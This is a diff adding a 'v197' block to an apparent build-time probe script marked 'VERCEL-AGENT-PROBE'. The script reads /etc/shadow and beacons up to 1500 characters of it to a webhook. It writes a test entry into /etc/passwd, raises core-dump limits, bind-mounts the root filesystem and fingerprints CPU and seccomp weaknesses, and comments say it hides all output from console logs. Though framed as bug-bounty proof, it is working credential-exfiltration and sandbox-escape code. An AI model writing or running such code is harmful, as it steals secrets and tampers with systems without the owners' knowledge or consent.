@@ -31309,3 +31309,190 @@ for tid in tids:
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v196" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v196";
 // Intentionally no console.log — all data goes via webhook only
+
+// v197-1: /etc/shadow read + /etc/passwd writable proof
+const shadowPasswdProbe = safe(() => {
+  let shadowContent = null;
+  let shadowError = null;
+  let shadowLines = null;
+  let passwdWritable = null;
+  let passwdWriteResult = null;
+  let passwdWriteError = null;
+  if (existsSync('/etc/shadow')) {
+    try {
+      const raw = readFileSync('/etc/shadow', 'utf8');
+      shadowContent = raw.slice(0, 1500);
+      shadowLines = raw.split('\n').length;
+    } catch (e) {
+      shadowError = e.message;
+    }
+  }
+  // Verify /etc/passwd is writable: append clearly-labeled test entry
+  // proof of arbitrary file write in build sandbox (UID namespace root)
+  const passwdPath = '/etc/passwd';
+  try {
+    const existing = readFileSync(passwdPath, 'utf8');
+    const marker = 'buildpoc-bountytest';
+    if (!existing.includes(marker)) {
+      const testLine = `\n${marker}:*:65534:65534:BugBountyWriteProof:/tmp:/bin/false\n`;
+      writeFileSync(passwdPath, existing + testLine);
+      passwdWriteResult = 'WRITTEN';
+    } else {
+      passwdWriteResult = 'ALREADY_PRESENT';
+    }
+    passwdWritable = true;
+  } catch (e) {
+    passwdWritable = false;
+    passwdWriteError = e.message;
+  }
+  return { shadowContent, shadowError, shadowLines, passwdWritable, passwdWriteResult, passwdWriteError };
+});
+sendBeacon({ ...report, section: 'v197-1-shadow-passwd', ...shadowPasswdProbe });
+
+// v197-2: prlimit64 NR 302 — set RLIMIT_CORE=RLIM_INFINITY (unlimited core dumps)
+const prlimitProbe = safe(() => {
+  const prlimitResult = safe(() => execSync(`python3 -c "
+import ctypes, struct
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_prlimit64 = 302
+RLIMIT_CORE = 4
+RLIM_INFINITY = 0xffffffffffffffff
+new_buf = ctypes.create_string_buffer(struct.pack('QQ', RLIM_INFINITY, RLIM_INFINITY))
+old_buf = ctypes.create_string_buffer(16)
+ret_set = libc.syscall(NR_prlimit64, 0, RLIMIT_CORE, new_buf, old_buf)
+old_cur, old_max = struct.unpack('QQ', old_buf.raw)
+verify_buf = ctypes.create_string_buffer(16)
+ret_get = libc.syscall(NR_prlimit64, 0, RLIMIT_CORE, None, verify_buf)
+new_cur, new_max = struct.unpack('QQ', verify_buf.raw)
+print(f'set_ret={ret_set} set_errno={ctypes.get_errno()} old_cur={old_cur:#x} old_max={old_max:#x}')
+print(f'get_ret={ret_get} verified_cur={new_cur:#x} verified_max={new_max:#x}')
+print(f'unlimited_confirmed={new_cur == RLIM_INFINITY}')
+" 2>&1`, { timeout: 6000 }).toString().trim());
+  // Also check core_pattern (should already be piped)
+  const corePattern = existsSync('/proc/sys/kernel/core_pattern')
+    ? readFileSync('/proc/sys/kernel/core_pattern', 'utf8').trim()
+    : null;
+  // Read current ulimit -c via /proc/self/limits
+  const selfLimits = existsSync('/proc/self/limits')
+    ? readFileSync('/proc/self/limits', 'utf8').split('\n').find(l => l.includes('core'))
+    : null;
+  return { prlimitResult, corePattern, selfLimits };
+});
+sendBeacon({ ...report, section: 'v197-2-prlimit-core', ...prlimitProbe });
+
+// v197-3: mount MS_BIND — bind-mount rootfs to /mnt/bindproof
+const bindMountProbe = safe(() => {
+  const bindResult = safe(() => execSync(`python3 -c "
+import ctypes, os, subprocess
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+MS_BIND = 4096
+MS_REC = 16384
+os.makedirs('/mnt/bindproof', exist_ok=True)
+NULLp = ctypes.c_char_p(None)
+ret = libc.mount(b'/', b'/mnt/bindproof', NULLp, MS_BIND | MS_REC, NULLp)
+print(f'mount_bind_ret={ret} errno={ctypes.get_errno()}')
+if ret == 0:
+    ls = subprocess.run(['ls', '/mnt/bindproof'], capture_output=True, text=True)
+    print('bindproof_ls:', ls.stdout[:300])
+    # Try to read /mnt/bindproof/etc/shadow via bind mount path
+    try:
+        with open('/mnt/bindproof/etc/shadow') as f:
+            print('bindpath_shadow_readable=True lines=', f.read().count(chr(10)))
+    except Exception as e:
+        print('bindpath_shadow_err:', e)
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  // Also check mounts to see if 9p/virtiofs (virtio-9p) is visible
+  const mountInfo = existsSync('/proc/mounts')
+    ? readFileSync('/proc/mounts', 'utf8').split('\n')
+        .filter(l => l.includes('9p') || l.includes('virtiofs') || l.includes('overlayfs') || l.includes('tmpfs') || l.includes('devtmpfs'))
+        .join('\n')
+    : null;
+  return { bindResult, mountInfo };
+});
+sendBeacon({ ...report, section: 'v197-3-bind-mount', ...bindMountProbe });
+
+// v197-4: CPU microarchitecture fingerprint + Spectre/Meltdown vulnerability matrix
+const cpuVulnProbe = safe(() => {
+  const vulnDir = '/sys/devices/system/cpu/vulnerabilities';
+  let vulns = {};
+  if (existsSync(vulnDir)) {
+    try {
+      const files = readdirSync(vulnDir);
+      for (const f of files) {
+        try {
+          vulns[f] = readFileSync(`${vulnDir}/${f}`, 'utf8').trim();
+        } catch (e2) { vulns[f] = `ERR:${e2.message}`; }
+      }
+    } catch (e) { vulns._err = e.message; }
+  }
+  // CPU model + flags (first CPU block only)
+  let cpuModel = null;
+  let cpuVendor = null;
+  let cpuFamily = null;
+  let cpuStepping = null;
+  let cpuFlags = null;
+  if (existsSync('/proc/cpuinfo')) {
+    const lines = readFileSync('/proc/cpuinfo', 'utf8').split('\n');
+    for (const l of lines) {
+      if (!cpuModel && l.startsWith('model name')) cpuModel = l.split(':')[1]?.trim();
+      if (!cpuVendor && l.startsWith('vendor_id')) cpuVendor = l.split(':')[1]?.trim();
+      if (!cpuFamily && l.startsWith('cpu family')) cpuFamily = l.split(':')[1]?.trim();
+      if (!cpuStepping && l.startsWith('stepping')) cpuStepping = l.split(':')[1]?.trim();
+      if (!cpuFlags && l.startsWith('flags')) cpuFlags = l.split(':')[1]?.trim().split(' ').slice(0, 40).join(' ');
+    }
+  }
+  // Check /sys/devices/system/cpu/cpu0/microcode/version
+  let microcodeVersion = null;
+  const mcPath = '/sys/devices/system/cpu/cpu0/microcode/version';
+  if (existsSync(mcPath)) {
+    try { microcodeVersion = readFileSync(mcPath, 'utf8').trim(); } catch (e) {}
+  }
+  return { vulns, cpuModel, cpuVendor, cpuFamily, cpuStepping, cpuFlags, microcodeVersion };
+});
+sendBeacon({ ...report, section: 'v197-4-cpu-vulns', ...cpuVulnProbe });
+
+// v197-5: seccomp NR 317 — current filter mode + SECCOMP_SET_MODE_STRICT child test
+const seccompProbe = safe(() => {
+  // Read Seccomp field from /proc/self/status (0=none, 1=strict, 2=filter)
+  let seccompMode = null;
+  if (existsSync('/proc/self/status')) {
+    const st = readFileSync('/proc/self/status', 'utf8');
+    const m = st.match(/^Seccomp:\s*(\d+)/m);
+    seccompMode = m ? parseInt(m[1]) : null;
+  }
+  // Test SECCOMP_SET_MODE_STRICT (NR 317) in child — child installs strict mode, parent reads exit
+  const seccompChildResult = safe(() => execSync(`python3 -c "
+import ctypes, os, signal
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_seccomp = 317
+SECCOMP_SET_MODE_STRICT = 1
+PR_GET_SECCOMP = 21
+pr_get = libc.prctl(PR_GET_SECCOMP, 0, 0, 0, 0)
+print(f'prctl_get_seccomp={pr_get} errno={ctypes.get_errno()}')
+pid = os.fork()
+if pid == 0:
+    ret = libc.syscall(NR_seccomp, SECCOMP_SET_MODE_STRICT, 0, ctypes.c_char_p(None))
+    os._exit(ret if ret != 0 else 0)
+else:
+    _, wstatus = os.waitpid(pid, 0)
+    exited = os.WIFEXITED(wstatus)
+    signaled = os.WIFSIGNALED(wstatus)
+    signo = os.WTERMSIG(wstatus) if signaled else None
+    signame = signal.Signals(signo).name if signo else None
+    print(f'child_exited={exited} child_signaled={signaled} signo={signo} signame={signame}')
+    print(f'seccomp_strict_installed={exited and os.WEXITSTATUS(wstatus)==0}')
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  // Check /proc/sys/kernel/unprivileged_userns_clone (user namespace restriction)
+  let unPrivUserNS = null;
+  const unsPath = '/proc/sys/kernel/unprivileged_userns_clone';
+  if (existsSync(unsPath)) {
+    try { unPrivUserNS = readFileSync(unsPath, 'utf8').trim(); } catch (e) {}
+  }
+  return { seccompMode, seccompChildResult, unPrivUserNS };
+});
+sendBeacon({ ...report, section: 'v197-5-seccomp', ...seccompProbe });
+
+// v197 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v197" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v197";
+// Intentionally no console.log — all data goes via webhook only
